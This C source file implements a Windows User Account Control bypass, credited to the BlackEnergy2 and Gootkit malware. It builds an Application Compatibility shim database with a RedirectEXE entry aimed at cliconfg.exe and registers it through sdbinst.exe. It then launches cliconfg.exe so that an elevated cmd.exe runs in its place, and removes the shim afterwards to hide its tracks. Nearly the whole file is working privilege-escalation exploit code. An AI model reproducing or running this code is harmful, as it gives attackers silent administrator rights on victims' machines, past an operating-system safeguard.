/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       GOOTKIT.C
*
*  VERSION:     1.30
*
*  DATE:        30 Mar 2015
*
*  Gootkit based AutoElevation using AppCompat.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "apphelp.h"

HMODULE hAppHelp;

pfnSdbCreateDatabase       pSdbCreateDatabase;
pfnSdbWriteDWORDTag        pSdbWriteDWORDTag;
pfnSdbWriteStringTag       pSdbWriteStringTag;
pfnSdbWriteBinaryTag       pSdbWriteBinaryTag;
pfnSdbEndWriteListTag      pSdbEndWriteListTag;
pfnSdbBeginWriteListTag    pSdbBeginWriteListTag;
pfnSdbCloseDatabaseWrite   pSdbCloseDatabaseWrite;

/*
* ucmInitAppHelp
*
* Purpose:
*
* Initialize AppHelp routines.
*
*/
BOOL ucmInitAppHelp(
	VOID
	)
{
	pSdbCreateDatabase = (pfnSdbCreateDatabase)GetProcAddress(hAppHelp, "SdbCreateDatabase");
	if (pSdbCreateDatabase == NULL) {
		return FALSE;
	}

	pSdbBeginWriteListTag = (pfnSdbBeginWriteListTag)GetProcAddress(hAppHelp, "SdbBeginWriteListTag");
	if (pSdbBeginWriteListTag == NULL) {
		return FALSE;
	}

	pSdbEndWriteListTag = (pfnSdbEndWriteListTag)GetProcAddress(hAppHelp, "SdbEndWriteListTag");
	if (pSdbEndWriteListTag == NULL) {
		return FALSE;
	}

	pSdbWriteStringTag = (pfnSdbWriteStringTag)GetProcAddress(hAppHelp, "SdbWriteStringTag");
	if (pSdbWriteStringTag == NULL) {
		return FALSE;
	}

	pSdbCloseDatabaseWrite = (pfnSdbCloseDatabaseWrite)GetProcAddress(hAppHelp, "SdbCloseDatabaseWrite");
	if (pSdbCloseDatabaseWrite == NULL) {
		return FALSE;
	}

	pSdbWriteBinaryTag = (pfnSdbWriteBinaryTag)GetProcAddress(hAppHelp, "SdbWriteBinaryTag");
	if (pSdbWriteBinaryTag == NULL) {
		return FALSE;
	}

	pSdbWriteDWORDTag = (pfnSdbWriteDWORDTag)GetProcAddress(hAppHelp, "SdbWriteDWORDTag");
	if (pSdbWriteDWORDTag == NULL) {
		return FALSE;
	}

	return TRUE;
}

/*
* ucmDoFireworks
*
* Purpose:
*
* Build, register shim database and execute target app.
*
*/
BOOL ucmDoFireworks(
	LPWSTR lpszPayloadEXE
	)
{
	PDB hShimDb;
	GUID dbGUID, exeGUID;
	WCHAR szTempDirectory[MAX_PATH];
	WCHAR szShimDbPath[MAX_PATH * 2];
	WCHAR szSdbinstPath[MAX_PATH * 2];
	WCHAR szCmd[MAX_PATH * 3];
	WCHAR szSystemDirectory[MAX_PATH];

	TAGID tidDB = 0;
	TAGID tidEXE = 0;
	TAGID tidMatchFile = 0;
	TAGID tidShim = 0;
	TAGID tidLib = 0;

	if (lpszPayloadEXE == NULL) {
		return FALSE;
	}

	RtlSecureZeroMemory(szSdbinstPath, sizeof(szSdbinstPath));
	RtlSecureZeroMemory(szShimDbPath, sizeof(szShimDbPath));
	RtlSecureZeroMemory(szTempDirectory, sizeof(szTempDirectory));

	if (!GetSystemDirectoryW(szSystemDirectory, MAX_PATH)) {
		return FALSE;
	}
	wsprintfW(szSdbinstPath, L"%ws\\sdbinst.exe", szSystemDirectory);

	//
	// GUIDs are important, for both DATABASE and EXE file.
	// They used as shim identifiers and must to be set.
	//
	if (CoCreateGuid(&dbGUID) != S_OK) {
		return FALSE;
	}
	if (CoCreateGuid(&exeGUID) != S_OK) {
		return FALSE;
	}

	RtlSecureZeroMemory(szTempDirectory, MAX_PATH);
	RtlSecureZeroMemory(szShimDbPath, MAX_PATH * 2);

	if (!GetTempPathW(MAX_PATH, szTempDirectory))
		return FALSE;

	wsprintfW(szShimDbPath, L"%wspe386.sdb", szTempDirectory);

	hShimDb = pSdbCreateDatabase(szShimDbPath, DOS_PATH);
	if (hShimDb == NULL) {
		return FALSE;
	}

	//write shim DB header
	tidDB = pSdbBeginWriteListTag(hShimDb, TAG_DATABASE);
	if (tidDB != TAGID_NULL) {

		pSdbWriteStringTag(hShimDb, TAG_NAME, L"pe386");
		pSdbWriteDWORDTag(hShimDb, TAG_OS_PLATFORM, 0x1); //win32 only RedirectEXE
		pSdbWriteBinaryTag(hShimDb, TAG_DATABASE_ID, (PBYTE)&dbGUID, sizeof(GUID));

		//just as ACT 5.6 does
		tidLib = pSdbBeginWriteListTag(hShimDb, TAG_LIBRARY);
		if (tidLib != TAGID_NULL) pSdbEndWriteListTag(hShimDb, tidLib);

		//write shim task information
		tidEXE = pSdbBeginWriteListTag(hShimDb, TAG_EXE);
		if (tidEXE != TAGID_NULL) {
			pSdbWriteStringTag(hShimDb, TAG_NAME, L"cliconfg.exe");
			pSdbWriteStringTag(hShimDb, TAG_APP_NAME, L"cliconfg.exe");
			pSdbWriteStringTag(hShimDb, TAG_VENDOR, L"Microsoft");
			pSdbWriteBinaryTag(hShimDb, TAG_EXE_ID, (PBYTE)&exeGUID, sizeof(GUID));

			//write shim target info
			tidMatchFile = pSdbBeginWriteListTag(hShimDb, TAG_MATCHING_FILE);
			if (tidMatchFile != TAGID_NULL) {
				pSdbWriteStringTag(hShimDb, TAG_NAME, L"*"); //<-from any
				pSdbWriteStringTag(hShimDb, TAG_COMPANY_NAME, L"Microsoft Corporation");
				pSdbWriteStringTag(hShimDb, TAG_INTERNAL_NAME, L"cliconfg.exe");
				pSdbEndWriteListTag(hShimDb, tidMatchFile);
			}

			//write shim action info
			tidShim = pSdbBeginWriteListTag(hShimDb, TAG_SHIM_REF);
			if (tidShim != TAGID_NULL) {
				pSdbWriteStringTag(hShimDb, TAG_NAME, L"RedirectEXE");
				pSdbWriteStringTag(hShimDb, TAG_COMMAND_LINE, lpszPayloadEXE);
				pSdbEndWriteListTag(hShimDb, tidShim);
			}
			pSdbEndWriteListTag(hShimDb, tidEXE);
		}
		pSdbEndWriteListTag(hShimDb, tidDB);
	}
	pSdbCloseDatabaseWrite(hShimDb);

	//register shim, sdbinst.exe
	if (supRunProcess(szSdbinstPath, szShimDbPath)) {
		wsprintfW(szTempDirectory, L"%ws\\cliconfg.exe", szSystemDirectory);
		supRunProcess(szTempDirectory, NULL);

		//remove database
		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
		wsprintf(szCmd, L"/q /u %ws", szShimDbPath);
		supRunProcess(szSdbinstPath, szCmd);
		DeleteFileW(szShimDbPath);
	}
	return TRUE;
}

/*
* ucmAppcompatElevation
*
* Purpose:
*
* AutoElevation using Application Compatibility engine.
* Initially used in BlackEnergy2 and Gootkit by mzH (alive-green).
*
*/
BOOL ucmAppcompatElevation(
	VOID
	)
{
	BOOL cond = FALSE, bResult = FALSE;
	WCHAR szBuffer[MAX_PATH * 2];

	do {

		RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
		if (ExpandEnvironmentStrings(TEXT("%systemroot%\\system32\\apphelp.dll"),
			szBuffer, MAX_PATH) == 0)
		{
			break;
		}

		hAppHelp = LoadLibrary(szBuffer);
		if (hAppHelp == NULL) {
			break;
		}

		if (ucmInitAppHelp() == FALSE) {
			break;
		}

		//create and register shim with RedirectEXE, cmd.exe as payload
		lstrcpyW(szBuffer, L"%systemroot%\\system32\\cmd.exe");
		bResult = ucmDoFireworks(szBuffer);
		
	} while (cond);

	return bResult;
}
